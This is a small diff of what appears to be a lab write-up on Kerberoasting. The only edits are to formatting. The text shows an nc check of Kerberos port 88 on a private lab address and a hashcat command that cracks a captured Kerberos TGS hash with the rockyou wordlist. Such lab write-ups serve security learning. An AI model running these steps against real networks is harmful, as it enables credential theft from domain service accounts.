@@ -14,7 +14,6 @@ Following the other attacks, we are already know the credentials from an User an
 
 ## Attack Execution Timeline:
 
-
 - Checked that Kerberos (port 88) is open:
 ```bash
 nc -vz 192.168.10.10 88
@@ -30,7 +29,7 @@ Output:
 ![hash](https://github.com/user-attachments/assets/25122eab-7eb9-4de7-a62d-2ceeda7e50c9)
 
 - Crack the Kerberos TGS Hash:
-After that I cracked the Kerberos TGS Hash using hashcat with rockyou.txt, and saved on a cracked.txt file:
+ - After that I cracked the Kerberos TGS Hash using hashcat with rockyou.txt, and saved on a cracked.txt file:
 ```bash
 hashcat -m 13100 spn_hash.txt /usr/share/wordlists/rockyou.txt --force -o cracked.txt
 ```
